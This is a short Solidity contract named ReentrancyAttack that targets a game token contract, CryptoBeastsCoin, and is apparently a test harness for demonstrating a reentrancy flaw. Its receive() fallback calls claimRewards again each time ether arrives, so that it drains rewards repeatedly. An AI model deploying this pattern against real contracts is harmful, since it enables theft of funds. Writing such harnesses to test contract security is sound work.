// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./CryptoBeastsCoin.sol";

contract ReentrancyAttack {
    CryptoBeastsCoin public gameToken;
    uint256 public initialRewards;

    constructor(CryptoBeastsCoin _gameToken) {
        gameToken = _gameToken;
    }

    function startAttack() public {
        initialRewards = gameToken.pendingRewards(address(this));
        gameToken.claimRewards();
    }

    receive() external payable {
        if (address(gameToken).balance >= msg.value) {
            gameToken.claimRewards();
        }
    }
}
